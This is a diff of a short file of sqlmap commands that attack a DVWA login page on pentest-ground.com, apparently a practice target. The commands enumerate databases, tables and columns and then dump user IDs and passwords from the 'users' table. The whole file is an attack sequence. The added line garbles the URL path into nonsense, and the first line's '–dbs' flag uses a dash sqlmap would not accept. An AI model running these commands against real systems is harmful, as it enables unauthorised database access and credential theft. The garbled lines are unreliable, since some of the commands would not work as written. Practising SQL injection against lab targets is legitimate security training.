@@ -1,4 +1,4 @@
 sqlmap -u "https://pentest-ground.com:4280/vulnerabilities/brute/?username=kali&password=kali&Login=Login#" –dbs 
-sqlmap -u "https://pentest-ground.com:4280/vulnerabilities/brute/?username=kali&password=kali&Login=Login#" -D dvwa --tables
+sqlmap -u "https://pentest-ground.com:4280/vdddddwemchb djulnerabilities/brute/?username=kali&password=kali&Login=Login#" -D dvwa --tables
 sqlmap -u "https://pentest-ground.com:4280/vulnerabilities/brute/?username=kali&password=kali&Login=Login#" -D dvwa -T users --columns
 sqlmap -u "https://pentest-ground.com:4280/vulnerabilities/brute/?username=kali&password=kali&Login=Login#" -D dvwa -T users -C user_id,password --dump
